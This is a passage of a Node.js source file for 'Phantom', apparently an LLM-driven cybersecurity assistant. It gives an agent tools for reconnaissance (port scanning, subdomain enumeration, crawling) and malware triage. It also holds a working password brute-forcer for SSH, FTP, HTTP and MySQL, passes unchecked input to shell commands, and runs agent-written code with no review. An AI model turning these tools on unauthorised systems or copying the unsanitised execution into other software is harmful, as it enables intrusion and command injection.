#!/usr/bin/env node
// Phantom — space evolving multi-agent terminal
// Zero dependencies. Run: node phantom.mjs

import fs from "fs";
import http from "http";
import { homedir, release } from "os";
import { resolve, join } from "path";
import { pathToFileURL } from "url";
import { createRequire } from "module";
const $r = createRequire(import.meta.url);

const BASE_DIR = resolve(homedir(), ".config", "phantom");
const MEMORY_DIR = resolve(BASE_DIR, "memory");
const KNOWLEDGE_DIR = resolve(BASE_DIR, "knowledge");
const TOOLS_DIR = resolve(BASE_DIR, "tools");
const REPORTS_DIR = resolve(BASE_DIR, "reports");
const PLAYBOOKS_DIR = resolve(BASE_DIR, "playbooks");

// ── Config ─────────────────────────────────────────────────
let _config = {};
try {
  const configPath = resolve(BASE_DIR, "config.json");
  if (fs.existsSync(configPath)) _config = JSON.parse(fs.readFileSync(configPath, "utf-8"));
} catch {}
if (_config.VT_API_KEY && !process.env.VT_API_KEY) process.env.VT_API_KEY = _config.VT_API_KEY;
// Load all provider API keys from config
const PROVIDER_KEYS = ["OPENAI_API_KEY","ANTHROPIC_API_KEY","GEMINI_API_KEY","GROQ_API_KEY","DEEPSEEK_API_KEY","MISTRAL_API_KEY","OPENROUTER_API_KEY","SHODAN_API_KEY","HIBP_API_KEY"];
for (const k of PROVIDER_KEYS) { if (_config[k] && !process.env[k]) process.env[k] = _config[k]; }
// Selected provider: env > config > "openai"
let PHANTOM_LLM_PROVIDER = process.env.PHANTOM_LLM_PROVIDER || _config.default_provider || "openai";
function setProvider(name) { PHANTOM_LLM_PROVIDER = name; process.env.PHANTOM_LLM_PROVIDER = name; _config.default_provider = name; try { fs.writeFileSync(resolve(BASE_DIR, "config.json"), JSON.stringify(_config, null, 2)); } catch {} }

// LLM instance — set after createProvider()
let llmInstance = null;

function ensureDirs() {
  if (!fs.existsSync(MEMORY_DIR)) fs.mkdirSync(MEMORY_DIR, { recursive: true });
  if (!fs.existsSync(KNOWLEDGE_DIR)) fs.mkdirSync(KNOWLEDGE_DIR, { recursive: true });
  if (!fs.existsSync(TOOLS_DIR)) fs.mkdirSync(TOOLS_DIR, { recursive: true });
}

function saveMemory(name, memory) {
  try {
    ensureDirs();
    const filePath = resolve(MEMORY_DIR, `${name}.json`);
    fs.writeFileSync(filePath, JSON.stringify(memory, null, 2), "utf-8");
  } catch (e) {}
}

function loadMemory(name) {
  try {
    ensureDirs();
    const filePath = resolve(MEMORY_DIR, `${name}.json`);
    if (!fs.existsSync(filePath)) return [];
    return JSON.parse(fs.readFileSync(filePath, "utf-8"));
  } catch (e) { return []; }
}

function saveKnowledge(name, knowledge) {
  try {
    ensureDirs();
    const filePath = resolve(KNOWLEDGE_DIR, `${name}.txt`);
    fs.writeFileSync(filePath, knowledge, "utf-8");
  } catch (e) {}
}

function loadKnowledge(name) {
  try {
    ensureDirs();
    const filePath = resolve(KNOWLEDGE_DIR, `${name}.txt`);
    if (!fs.existsSync(filePath)) return "";
    return fs.readFileSync(filePath, "utf-8");
  } catch (e) { return ""; }
}

function saveDynamicTool(toolName, code) {
  ensureDirs();
  const fileName = `dynamic_${toolName.toLowerCase().replace(/[^a-z0-9_]/g, "_")}.js`;
  const filePath = join(TOOLS_DIR, fileName);
  let fileContent = code;
  if (!code.includes("export async function execute") && !code.includes("export function execute") && !code.includes("export default")) {
    fileContent = `export async function execute(input) { ${code} }`;
  }
  fs.writeFileSync(filePath, fileContent, "utf-8");
  return filePath;
}

async function loadDynamicTool(filePath, toolName, description) {
  const fileUrl = pathToFileURL(filePath).href;
  const module = await import(`${fileUrl}?t=${Date.now()}`);
  const executeFn = module.execute || module.default;
  if (typeof executeFn !== "function") {
    throw new Error(`Dynamic tool ${toolName} does not export 'execute' function.`);
  }
  return {
    name: toolName,
    description,
    execute: async (input, agentCtx) => {
      try {
        return String(await executeFn(input, agentCtx));
      } catch (err) {
        return `[Tool Error in ${toolName}]: ${err.message}`;
      }
    }
  };
}

async function loadAllDynamicTools() {
  ensureDirs();
  try {
    const files = fs.readdirSync(TOOLS_DIR);
    const tools = [];
    for (const file of files) {
      if (file.startsWith("dynamic_") && file.endsWith(".js")) {
        const filePath = join(TOOLS_DIR, file);
        const name = file.replace("dynamic_", "").replace(".js", "");
        tools.push({ name, description: `Dynamic tool ${name}`, filePath });
      }
    }
    return tools;
  } catch (e) { return []; }
}

// ── Hacker Tools ──────────────────────────────────────────
const hackerTools = {
  shell: async (cmd) => {
    // Execute a shell command and return output
    try {
      const { execSync } = await import("child_process");
      const r = execSync(cmd, { encoding: "utf-8", timeout: 30000, maxBuffer: 1024 * 1024 });
      return r.trim().substring(0, 4000) || "(empty output)";
    } catch (e) {
      return `[Shell Error] ${e.stderr?.substring(0, 500) || e.message}`;
    }
  },

  web_fetch: async (url) => {
    // Fetch a URL and return the content
    try {
      const r = await fetch(url, { signal: AbortSignal.timeout(15000) });
      const text = await r.text();
      const ct = r.headers.get("content-type") || "";
      const isHtml = ct.includes("text/html");
      // Strip HTML tags for readability
      const cleaned = isHtml
        ? text.replace(/<script[^>]*>[\s\S]*?<\/script>/gi, "")
             .replace(/<style[^>]*>[\s\S]*?<\/style>/gi, "")
             .replace(/<[^>]+>/g, " ")
             .replace(/\s+/g, " ")
             .trim()
        : text;
      return `Status ${r.status}\n${cleaned.substring(0, 3000)}`;
    } catch (e) {
      return `[Fetch Error] ${e.message}`;
    }
  },

  decode: async (input) => {
    // Auto-detect and decode encoded strings
    const s = input.trim();
    const results = [];
    // Base64
    try {
      const decoded = Buffer.from(s, "base64").toString("utf-8");
      if (/^[\x20-\x7E\s]+$/.test(decoded)) results.push(`base64: ${decoded}`);
    } catch {}
    // Hex
    const hexClean = s.replace(/\\x/g, "").replace(/0x/g, "").replace(/\s/g, "");
    if (/^[0-9a-fA-F]+$/.test(hexClean) && hexClean.length % 2 === 0) {
      try {
        const decoded = Buffer.from(hexClean, "hex").toString("utf-8");
        if (/^[\x20-\x7E\s]+$/.test(decoded)) results.push(`hex: ${decoded}`);
      } catch {}
    }
    // URL decode
    try { if (s.includes("%")) results.push(`url: ${decodeURIComponent(s)}`); } catch {}
    // Binary
    if (/^[01\s]+$/.test(s)) {
      try {
        const bin = s.replace(/\s/g, "");
        const chars = [];
        for (let i = 0; i < bin.length; i += 8) {
          chars.push(String.fromCharCode(parseInt(bin.substring(i, i+8), 2)));
        }
        results.push(`binary: ${chars.join("")}`);
      } catch {}
    }
    // ROT13
    results.push(`rot13: ${s.replace(/[a-zA-Z]/g, c => {
      const code = c.charCodeAt(0);
      const base = c <= 'Z' ? 65 : 97;
      return String.fromCharCode(((code - base + 13) % 26) + base);
    })}`);
    return results.length ? results.join("\n") : "[Decoder] No known encoding detected";
  },

  file_analyze: async (path) => {
    // Analyze a file: hashes, entropy, strings, type detection
    try {
      const { existsSync, statSync, readFileSync } = await import("fs");
      if (!existsSync(path)) return `[Error] File not found: ${path}`;
      const buf = readFileSync(path);
      const size = buf.length;
      const { createHash } = await import("crypto");
      const md5 = createHash("md5").update(buf).digest("hex");
      const sha1 = createHash("sha1").update(buf).digest("hex");
      const sha256 = createHash("sha256").update(buf).digest("hex");
      // Entropy
      const freq = new Map();
      for (const b of buf) freq.set(b, (freq.get(b) || 0) + 1);
      let entropy = 0;
      for (const count of freq.values()) { const p = count / size; entropy -= p * Math.log2(p); }
      // Strings extraction
      let cur = "", strs = [];
      for (let i = 0; i < buf.length; i++) {
        const c = buf[i];
        if (c >= 32 && c <= 126) { cur += String.fromCharCode(c); }
        else { if (cur.length >= 6) strs.push(cur); cur = ""; }
      }
      if (cur.length >= 6) strs.push(cur);
      // File type via magic bytes
      const magic = buf.slice(0, 16).toString("hex");
      let fileType = "unknown";
      if (magic.startsWith("4d5a")) fileType = "PE (Windows executable/DLL)";
      else if (magic.startsWith("7f454c46")) fileType = "ELF (Linux binary)";
      else if (magic.startsWith("89504e47")) fileType = "PNG image";
      else if (magic.startsWith("ffd8")) fileType = "JPEG image";
      else if (magic.startsWith("504b0304")) fileType = "ZIP/PK archive";
      else if (magic.startsWith("25504446")) fileType = "PDF document";
      else if (magic.startsWith("d0cf11e0a1b11ae1")) fileType = "OLE2 (Office doc)";
      else if (magic.startsWith("1f8b")) fileType = "GZIP compressed";
      else if (magic.startsWith("424d")) fileType = "BMP image";
      else if (magic.startsWith("47494638")) fileType = "GIF image";
      else if (magic.startsWith("cafebabe")) fileType = "Java class";
      else if (magic.startsWith("52617221")) fileType = "RAR archive";
      else if (magic.startsWith("1f9d") || magic.startsWith("1fa0")) fileType = "Compress'd archive";
      else if (buf.slice(0, 3).toString() === "#!/") fileType = "Script";
      else if (buf.slice(0, 4).toString() === "MZ") fileType = "DOS executable";

      const entropyLabel = entropy > 7.2 ? "SUSPICIOUS - likely encrypted/packed malware" :
                           entropy > 6.5 ? "High - possible packing/encryption" :
                           entropy > 5.0 ? "Medium" : "Low (plain text/native code)";

      const sample = strs.slice(0, 25).join("\n").substring(0, 2000);

      return [
        `📁 ${path}`,
        `Size: ${(size / 1024).toFixed(1)} KB (${size} bytes)`,
        `Type: ${fileType}`,
        `Entropy: ${entropy.toFixed(4)} — ${entropyLabel}`,
        `MD5:    ${md5}`,
        `SHA1:   ${sha1}`,
        `SHA256: ${sha256}`,
        `── Strings (${strs.length} found, showing first 25) ──`,
        sample || "(no printable strings ≥6 chars)",
      ].join("\n");
    } catch (e) {
      return `[Analyze Error] ${e.message}`;
    }
  },

  dns_lookup: async (domain) => {
    // DNS resolution: A, AAAA, MX, NS, TXT records
    try {
      const dns = await import("dns/promises");
      const results = [`DNS records for ${domain}:`];
      const checks = [
        ["A", dns.resolve4(domain).catch(() => [])],
        ["AAAA", dns.resolve6(domain).catch(() => [])],
        ["MX", dns.resolveMx(domain).catch(() => [])],
        ["NS", dns.resolveNs(domain).catch(() => [])],
        ["TXT", dns.resolveTxt(domain).catch(() => [])],
        ["CNAME", dns.resolveCname(domain).catch(() => [])],
        ["SOA", dns.resolveSoa(domain).catch(() => [])],
      ];
      for (const [label, promise] of checks) {
        try {
          const val = await promise;
          if (Array.isArray(val) && val.length) {
            if (label === "MX") results.push(`  MX: ${val.map(m => `${m.exchange} (prio ${m.priority})`).join(", ")}`);
            else if (label === "TXT") results.push(`  TXT: ${val.flat().join(", ")}`);
            else if (label === "SOA") results.push(`  SOA: ${val.nsname} (admin: ${val.hostmaster})`);
            else results.push(`  ${label}: ${val.join(", ")}`);
          }
        } catch {}
      }
      if (results.length === 1) results.push("  (no records found)");
      return results.join("\n");
    } catch (e) {
      return `[DNS Error] ${e.message}`;
    }
  },

  hash: async (input) => {
    // Hash text or file with MD5/SHA1/SHA256
    try {
      const { createHash } = await import("crypto");
      const { existsSync, readFileSync } = await import("fs");
      let data;
      let label = "text";
      if (existsSync(input)) {
        data = readFileSync(input);
        label = `file (${input})`;
      } else {
        data = Buffer.from(input, "utf-8");
      }
      return [
        `Hash of ${label}:`,
        `MD5:    ${createHash("md5").update(data).digest("hex")}`,
        `SHA1:   ${createHash("sha1").update(data).digest("hex")}`,
        `SHA256: ${createHash("sha256").update(data).digest("hex")}`,
      ].join("\n");
    } catch (e) {
      return `[Hash Error] ${e.message}`;
    }
  },

  whois: async (domain) => {
    try {
      const { execSync } = await import("child_process");
      const r = execSync(`whois ${domain}`, { encoding: "utf-8", timeout: 15000, maxBuffer: 1024 * 1024 });
      const out = r.trim();
      if (!out) return "(empty whois result)";
      const lines = out.split("\n").filter(l => !l.startsWith("%") && !l.startsWith("#"));
      return lines.slice(0, 60).join("\n").substring(0, 4000);
    } catch (e) {
      return `[WHOIS Error] ${e.stderr?.substring(0, 500) || e.message}`;
    }
  },

  port_scan: async (target) => {
    const COMMON_PORTS = {
      21: "FTP", 22: "SSH", 23: "Telnet", 25: "SMTP", 53: "DNS",
      80: "HTTP", 110: "POP3", 111: "RPC", 135: "MSRPC", 139: "NetBIOS",
      143: "IMAP", 443: "HTTPS", 445: "SMB", 993: "IMAPS", 995: "POP3S",
      1433: "MSSQL", 1521: "Oracle", 2049: "NFS", 3306: "MySQL",
      3389: "RDP", 5432: "PG", 5900: "VNC", 5985: "WinRM", 5986: "WinRMS",
      6379: "Redis", 8080: "Proxy", 8443: "AltHTTPS", 9000: "PHP", 27017: "Mongo",
    };
    const parts = target.split(":");
    const host = parts[0];
    let ports = [];
    if (parts[1]) {
      if (parts[1].includes("-")) {
        const [s, e] = parts[1].split("-").map(Number);
        if (!isNaN(s) && !isNaN(e)) for (let i = s; i <= e; i++) ports.push(i);
      } else {
        ports = parts[1].split(",").map(Number).filter(n => !isNaN(n));
      }
    }
    if (!ports.length) ports = Object.keys(COMMON_PORTS).map(Number);
    const { default: net } = await import("net");
    const results = [`Port scan: ${host} (${ports.length} ports)`];
    for (let i = 0; i < ports.length; i += 20) {
      const batch = ports.slice(i, i + 20);
      await Promise.all(batch.map(port => new Promise(resolve => {
        const s = new net.Socket();
        s.setTimeout(2000);
        s.on("connect", () => { results.push(`  ${port}/tcp  open  ${COMMON_PORTS[port] || "?"}`); s.destroy(); resolve(); });
        s.on("error", () => resolve());
        s.on("timeout", () => { s.destroy(); resolve(); });
        s.connect(port, host);
      })));
    }
    if (results.length === 1) results.push("  (all filtered/closed)");
    return results.join("\n");
  },

  http_headers: async (url) => {
    try {
      const r = await fetch(url, { method: "HEAD", signal: AbortSignal.timeout(10000), redirect: "manual" });
      const h = [];
      r.headers.forEach((v, k) => h.push(`  ${k}: ${v}`));
      return `URL: ${url}\nStatus: ${r.status} ${r.statusText}\n── Headers ──\n${h.join("\n")}`;
    } catch (e) { return `[HTTP Header Error] ${e.message}`; }
  },

  ssl_check: async (host) => {
    const [hn, ps] = host.includes(":") ? host.split(":") : [host, "443"];
    const port = parseInt(ps) || 443;
    const { default: tls } = await import("tls");
    return new Promise(resolve => {
      const sock = tls.connect(port, hn, { servername: hn, rejectUnauthorized: false }, () => {
        const cert = sock.getPeerCertificate();
        const lines = [
          `SSL for ${hn}:${port}`,
          `Subject: ${cert.subject ? Object.entries(cert.subject).map(([k,v])=>`${k}=${v}`).join(", ") : "N/A"}`,
          `Issuer: ${cert.issuer ? Object.entries(cert.issuer).map(([k,v])=>`${k}=${v}`).join(", ") : "N/A"}`,
          `From: ${cert.valid_from || "N/A"}  To: ${cert.valid_to || "N/A"}`,
          `Serial: ${cert.serialNumber || "N/A"}`,
          `SHA256: ${cert.fingerprint256 || "N/A"}`,
          `SANs: ${(cert.subjectaltname||"").replace(/DNS:/g,"").split(", ").join(", ")}`,
        ];
        const days = cert.valid_to ? Math.floor((new Date(cert.valid_to) - Date.now())/86400000) : null;
        if (days !== null) lines.push(`Expires in ${days}d ${days < 0 ? "EXPIRED" : days < 30 ? "⚠ SOON" : "OK"}`);
        const ciph = sock.getCipher();
        if (ciph) lines.push(`Cipher: ${ciph.name} (${ciph.version})`);
        sock.end();
        resolve(lines.join("\n"));
      });
      sock.on("error", e => resolve(`[SSL Error] ${e.message}`));
      sock.setTimeout(10000, () => { sock.destroy(); resolve("[SSL Error] Timeout"); });
    });
  },

  sub_enum: async (domain) => {
    try {
      const clean = domain.replace(/^https?:\/\//,"").replace(/\/.*$/,"").trim();
      const r = await fetch(`https://crt.sh/?q=%25.${clean}&output=json`, {
        signal: AbortSignal.timeout(20000), headers: { "User-Agent": "Phantom/1.0" },
      });
      if (!r.ok) return `[crt.sh] HTTP ${r.status}`;
      const data = await r.json();
      if (!Array.isArray(data) || !data.length) return `(no subs for ${clean})`;
      const subs = [...new Set(data.flatMap(d => (d.name_value||"").split("\n")))].filter(s => s.endsWith(`.${clean}`) || s === clean).sort();
      return subs.length ? subs.join("\n") : `(no subs for ${clean})`;
    } catch (e) { return `[Sub Error] ${e.message}`; }
  },

  crawl: async (url) => {
    try {
      const r = await fetch(url, { signal: AbortSignal.timeout(15000) });
      const html = await r.text();
      const base = url.replace(/\/[^/]*$/, "");
      const links = new Set();
      const linkRe = /<a[^>]+href\s*=\s*["']([^"']+)["']/gi;
      let m;
      while ((m = linkRe.exec(html)) !== null) {
        let h = m[1].split("#")[0].split("?")[0];
        if (!h || h.startsWith("javascript:") || h.startsWith("mailto:")) continue;
        if (h.startsWith("//")) h = `https:${h}`;
        else if (h.startsWith("/")) try { h = new URL(h, url).href; } catch { continue; }
        else if (!h.startsWith("http")) h = `${base}/${h}`;
        try { links.add(new URL(h).href); } catch {}
      }
      const forms = [...html.matchAll(/<form[^>]+action\s*=\s*["']([^"']*)["'][^>]*>/gi)].map(m => m[1]);
      const scripts = [...html.matchAll(/<script[^>]+src\s*=\s*["']([^"']+)["']/gi)].map(m => m[1]);
      const lines = [
        `🌐 Crawl: ${url}`, `Status: ${r.status}`, `Type: ${r.headers.get("content-type")||"N/A"}`,
        `Links: ${links.size}`, ...[...links].slice(0,30).map(l => `  ${l}`),
      ];
      if (forms.length) lines.push(`Forms (${forms.length}):`, ...forms.slice(0,5).map(f => `  action="${f}"`));
      if (scripts.length) lines.push(`Scripts (${scripts.length}):`, ...scripts.slice(0,10).map(s => `  ${s}`));
      return lines.join("\n");
    } catch (e) { return `[Crawl Error] ${e.message}`; }
  },

  vt_check: async (hash) => {
    const key = process.env.VT_API_KEY || "";
    if (!key) return "[VT] Set VT_API_KEY env var (free: https://virustotal.com)";
    try {
      const r = await fetch(`https://www.virustotal.com/api/v3/files/${hash.trim()}`, {
        headers: { "x-apikey": key, Accept: "application/json" },
        signal: AbortSignal.timeout(15000),
      });
      if (r.status === 404) return `[VT] Hash "${hash}" not found`;
      if (!r.ok) return `[VT] HTTP ${r.status}`;
      const d = (await r.json())?.data?.attributes || {};
      const st = d.last_analysis_stats || {};
      const res = d.last_analysis_results || {};
      const mal = st.malicious || 0, sus = st.suspicious || 0, harm = st.harmless || 0, und = st.undetected || 0;
      const lines = [
        `🔬 VT: ${hash}`, `File: ${d.meaningful_name || "N/A"}`, `Type: ${d.type_description || d.type || "N/A"}`,
        `Size: ${d.size||"N/A"}b`, `First: ${d.first_submission_date ? new Date(d.first_submission_date*1000).toISOString().split("T")[0] : "N/A"}`,
        `Detect: ${mal} mal / ${sus} sus / ${harm} harm / ${und} und (${mal+sus+harm+und} engines)`,
      ];
      for (const [eng, r2] of Object.entries(res)) if (r2.category === "malicious") lines.push(`  ${eng}: ${r2.result}`);
      if (d.names) { lines.push(`Names:`); d.names.slice(0,10).forEach(n => lines.push(`  ${n}`)); }
      return lines.join("\n");
    } catch (e) { return `[VT Error] ${e.message}`; }
  },

  yara: async (input) => {
    const parts = input.split("|").map(s => s.trim());
    const [rules, target] = parts.length >= 2 ? parts : ["", parts[0]];
    try {
      const r = (await import("child_process")).execSync(
        rules ? `yara ${rules} ${target}` : `yara ${target}`,
        { encoding: "utf-8", timeout: 30000, maxBuffer: 1024 * 1024 }
      ).trim();
      return r ? `YARA: ${target}\n${r}` : "(no YARA matches)";
    } catch (e) {
      const err = e.stderr?.toString() || e.message || "";
      if (err.includes("command not found")) return "[YARA] Install: apt install yara";
      if (e.status === 0) return "(no YARA matches)";
      return `[YARA Error] ${err.substring(0,500)}`;
    }
  },

  recon: async (target) => {
    const domain = target.replace(/^https?:\/\//, "").replace(/\/.*$/, "").trim();
    const ts = new Date().toISOString().replace(/[:.]/g, "-");
    const lines = [
      "╔══════════════════════════════════════╗",
      "║  PHANTOM AUTOMATED RECON            ║",
      `║  Target: ${domain.padEnd(32)}║`,
      `║  Date:   ${ts.slice(0, 19).padEnd(27)}║`,
      "╚══════════════════════════════════════╝", "",
    ];
    try { lines.push("── [1/7] WHOIS ──", await hackerTools.whois(domain)); } catch {}
    try { lines.push("\n── [2/7] DNS ──", await hackerTools.dns_lookup(domain)); } catch {}
    try { lines.push("\n── [3/7] SUBDOMAINS ──", await hackerTools.sub_enum(domain)); } catch {}
    try { lines.push("\n── [4/7] HTTP HEADERS ──", await hackerTools.http_headers(`https://${domain}`)); } catch {}
    try { lines.push("\n── [5/7] SSL ──", await hackerTools.ssl_check(domain)); } catch {}
    try { lines.push("\n── [6/7] PORTS ──", await hackerTools.port_scan(domain)); } catch {}
    try { lines.push("\n── [7/7] CRAWL ──", await hackerTools.crawl(`https://${domain}`)); } catch {}
    if (!fs.existsSync(REPORTS_DIR)) fs.mkdirSync(REPORTS_DIR, { recursive: true });
    const reportPath = resolve(REPORTS_DIR, `recon_${domain}_${ts}.md`);
    fs.writeFileSync(reportPath, lines.join("\n"), "utf-8");
    lines.push(`\n📄 Report saved: ${reportPath}`);
    return lines.join("\n");
  },

  cve_search: async (query) => {
    try {
      const r = await fetch(
        `https://services.nvd.nist.gov/rest/json/cves/2.0?keywordSearch=${encodeURIComponent(query)}&resultsPerPage=12`,
        { signal: AbortSignal.timeout(20000), headers: { "User-Agent": "Phantom/1.0" } }
      );
      if (!r.ok) return `[NVD] HTTP ${r.status}`;
      const data = await r.json();
      const vulns = data?.vulnerabilities || [];
      if (!vulns.length) return `(no CVEs for "${query}")`;
      const lines = [`🔍 CVEs for "${query}": ${vulns.length} found\n`];
      for (const v of vulns.slice(0, 15)) {
        const c = v.cve || {};
        const id = c.id || "N/A";
        const desc = c.descriptions?.find(d => d.lang === "en")?.value || "";
        const cvss = c.metrics?.cvssMetricV31?.[0]?.cvssData || c.metrics?.cvssMetricV2?.[0]?.cvssData || {};
        lines.push(`[${id}] ${cvss.baseSeverity || "?"} (${cvss.baseScore || "?"}) — ${(c.published||"").split("T")[0] || "?"}`);
        if (desc) lines.push(`  ${desc.substring(0, 180)}`);
        lines.push(`  https://nvd.nist.gov/vuln/detail/${id}\n`);
      }
      return lines.join("\n");
    } catch (e) { return `[CVE Error] ${e.message}`; }
  },

  searchsploit: async (query) => {
    try {
      const r = (await import("child_process")).execSync(`searchsploit ${query} 2>/dev/null`, { encoding: "utf-8", timeout: 15000 });
      if (r.trim()) return `🔧 Exploit-DB:\n${r.trim().substring(0, 4000)}`;
    } catch {}
    try {
      const r = await fetch(`https://packetstormsecurity.com/search/?q=${encodeURIComponent(query)}`, { signal: AbortSignal.timeout(15000), headers: { "User-Agent": "Mozilla/5.0" } });
      const html = await r.text();
      const lines = [`🔧 Exploits for "${query}":`];
      const matches = html.match(/<a[^>]+href="\/files\/[^"]+"[^>]*>[\s\S]{0,150}?<\/a>/gi) || [];
      for (const m of matches.slice(0, 15)) {
        const url = m.match(/href="([^"]+)"/)?.[1];
        const text = m.replace(/<[^>]+>/g, "").trim().substring(0, 100);
        if (url && text) lines.push(`  ${text} → https://packetstormsecurity.com${url}`);
      }
      return lines.length > 1 ? lines.join("\n") : `  Try: https://www.exploit-db.com/search?q=${encodeURIComponent(query)}`;
    } catch (e) { return `[Search Error] ${e.message}`; }
  },

  bruteforce: async (input) => {
    const parts = input.split("|").map(s => s.trim());
    if (parts.length < 4) return `[Brute] Usage: protocol|target|user|pass1,pass2,pass3\nProtocols: ssh, ftp, http, mysql`;
    const [protocol, target, user, passStr] = parts;
    const passes = passStr.split(",").map(s => s.trim()).filter(Boolean);
    const results = [`🔑 Brute: ${protocol}://${target}`, `  User: ${user}`, `  Passwords: ${passes.length}`, ""];
    const { default: net } = await import("net");

    async function tryOne(protocol, target, user, pass) {
      switch (protocol) {
        case "ssh": {
          try {
            (await import("child_process")).execSync(
              `sshpass -p '${pass.replace(/'/g, "'\\''")}' ssh -o StrictHostKeyChecking=no -o ConnectTimeout=5 ${user}@${target} 'id' 2>/dev/null`,
              { encoding: "utf-8", timeout: 10000 }
            );
            return "✅ SUCCESS";
          } catch { return "❌ failed"; }
        }
        case "ftp": {
          return new Promise(resolve => {
            const s = new net.Socket(); let buf = "";
            s.setTimeout(5000);
            s.on("data", d => {
              buf += d.toString();
              if (buf.includes("220 ") || buf.includes("ready")) s.write(`USER ${user}\r\n`);
              else if (buf.includes("331 ") || buf.includes("User")) s.write(`PASS ${pass}\r\n`);
              else if (buf.includes("230 ") || buf.includes("Logged")) { s.destroy(); resolve("✅ SUCCESS"); }
              else if (buf.includes("530 ") || buf.includes("Login") || buf.includes("incorrect")) { s.destroy(); resolve("❌ failed"); }
            });
            s.on("error", () => resolve("❌ error"));
            s.on("timeout", () => { s.destroy(); resolve("❌ timeout"); });
            const [h, p] = target.includes(":") ? target.split(":") : [target, "21"];
            s.connect(parseInt(p) || 21, h);
          });
        }
        case "http": {
          try {
            const r = await fetch(target, { method: "POST", headers: { "Content-Type": "application/x-www-form-urlencoded" }, body: new URLSearchParams({ username: user, password: pass, log: user, pwd: pass }).toString(), redirect: "manual", signal: AbortSignal.timeout(8000) });
            if (r.status === 302 || r.status === 301) return "✅ redirect";
            const t = await r.text().catch(() => "");
            if (r.status === 200 && !t.includes("incorrect") && !t.includes("Invalid") && !t.includes("error")) return !t.includes("password") && !t.includes("login") ? "⚠ maybe" : "❌ failed";
            return r.status === 401 || r.status === 403 ? "❌ denied" : "❌ failed";
          } catch { return "❌ error"; }
        }
        case "mysql": {
          try {
            const r = (await import("child_process")).execSync(
              `mysql -u '${user}' -p'${pass.replace(/'/g, "'\\''")}' -h '${target}' -e 'SELECT 1' --connect-timeout=5 2>/dev/null`, { encoding: "utf-8", timeout: 10000 }
            );
            return r.includes("1") ? "✅ SUCCESS" : "❌ failed";
          } catch { return "❌ failed"; }
        }
        default: return "❌ unknown";
      }
    }

    const pad = `${user}:`.padEnd(25);
    for (const pass of passes) {
      const r = await tryOne(protocol, target, user, pass);
      results.push(`  ${pad} ${pass.padEnd(20)} → ${r}`);
      if (r.startsWith("✅") || r.startsWith("⚠")) { results.push(`\n🎯 FOUND: ${user}:${pass}`); break; }
    }
    return results.join("\n");
  },

  // ── FILE TOOLS ──
  file_read: async (path) => {
    try {
      const resolved = resolve(path);
      if (!fs.existsSync(resolved)) return `[File Error] Not found: ${path}`;
      const content = fs.readFileSync(resolved, "utf-8");
      if (content.length > 100000) return `[File Error] Too large (>100KB): ${path} (${content.length} chars)`;
      return content;
    } catch (e) {
      if (e.code === "EISDIR") return `[File Error] Is a directory: ${path}`;
      return `[File Error] ${e.message}`;
    }
  },

  file_write: async (input) => {
    const idx = input.indexOf("|");
    if (idx === -1) return "[File Write] Usage: path|content";
    const path = input.substring(0, idx).trim();
    const content = input.substring(idx + 1);
    if (!path || !content) return "[File Write] Usage: path|content";
    try {
      const resolved = resolve(path);
      const dir = resolve(resolved, "..");
      if (!fs.existsSync(dir)) fs.mkdirSync(dir, { recursive: true });
      fs.writeFileSync(resolved, content, "utf-8");
      return `✅ Wrote ${content.length} bytes to ${resolved}`;
    } catch (e) { return `[File Write Error] ${e.message}`; }
  },

  file_edit: async (input) => {
    const parts = input.split("|");
    if (parts.length < 3) return "[File Edit] Usage: path|old_string|new_string";
    const [path, oldStr, ...rest] = parts;
    const newStr = rest.join("|");
    try {
      const resolved = resolve(path);
      if (!fs.existsSync(resolved)) return `[File Edit] Not found: ${path}`;
      let content = fs.readFileSync(resolved, "utf-8");
      if (!content.includes(oldStr)) return `[File Edit] String not found`;
      content = content.replace(oldStr, newStr);
      fs.writeFileSync(resolved, content, "utf-8");
      return `✅ Edited ${path}`;
    } catch (e) { return `[File Edit Error] ${e.message}`; }
  },

  file_search: async (input) => {
    const parts = input.split("|").map(s => s.trim());
    const searchPath = parts.length >= 2 ? parts[0] : ".";
    const pattern = parts.length >= 2 ? parts[1] : parts[0];
    if (!pattern) return "[File Search] Usage: [path|]pattern";
    try {
      const { execSync } = await import("child_process");
      const r = execSync(`rg -rn '${pattern.replace(/'/g, "'\\''")}' '${searchPath}' 2>/dev/null | head -40`, { encoding: "utf-8", timeout: 15000 });
      if (!r.trim()) return `(no matches for "${pattern}" in ${searchPath})`;
      const lines = r.trim().split("\n");
      return `🔍 "${pattern}" in ${searchPath}: ${lines.length} matches\n${lines.slice(0, 40).join("\n")}`;
    } catch { return `(no matches for "${pattern}" in ${searchPath})`; }
  },

  file_list: async (path) => {
    try {
      const resolved = resolve(path || ".");
      if (!fs.existsSync(resolved)) return `[File List] Not found: ${path}`;
      const entries = fs.readdirSync(resolved, { withFileTypes: true });
      const lines = [`📁 ${resolved}:`];
      const dirs = [], files = [];
      for (const e of entries) {
        if (e.name.startsWith(".")) continue;
        if (e.isDirectory()) dirs.push(e.name);
        else files.push(e.name);
      }
      dirs.sort().forEach(d => lines.push(`  📁 ${d}/`));
      files.sort().forEach(f => { try { const s = fs.statSync(resolve(resolved, f)); lines.push(`  📄 ${f} (${s.size.toLocaleString()}b)`); } catch { lines.push(`  📄 ${f}`); } });
      lines.push(`\n${dirs.length} dirs, ${files.length} files`);
      return lines.join("\n");
    } catch (e) { return `[File List Error] ${e.message}`; }
  },

  // ── SELF TOOLS ──
  self_info: async () => {
    try {
      const phantomDir = resolve(import.meta.dirname || ".", ".");
      const pkg = fs.existsSync(resolve(phantomDir, "package.json"))
        ? JSON.parse(fs.readFileSync(resolve(phantomDir, "package.json"), "utf-8")) : {};
      const names = Object.keys(hackerTools).sort();
      const llmAvail = llmInstance?.hasLLM;
      const llmName = llmInstance?.provider || PHANTOM_LLM_PROVIDER || "openai";
      return [
        `╔══════════════════════════════════════╗`,
        `║  PHANTOM — Cybersecurity Assistant   ║`,
        `╚══════════════════════════════════════╝`,
        ``,
        `Version:  ${pkg.version || "dev"}`,
        `Runtime:  Node.js ${process.version}`,
        `Platform: ${process.platform} ${process.arch}${ENV.isProot ? " 🔒 PRoot" : ""}${ENV.isTermux ? " 📱 Termux" : ""}`,
        `Project:  ${phantomDir}`,
        ``,
        `📦 ${names.length} Tools:`,
        `  ${names.join(", ")}`,
        ``,
        `🤖 ${llmAvail ? `LLM: ${llmName}` : "LLM: Not connected (set API key with @llm_config)"}`,
      ].join("\n");
    } catch (e) { return `[Self Info Error] ${e.message}`; }
  },

  self_read: async (path) => {
    try {
      const phantomDir = resolve(import.meta.dirname || ".", ".");
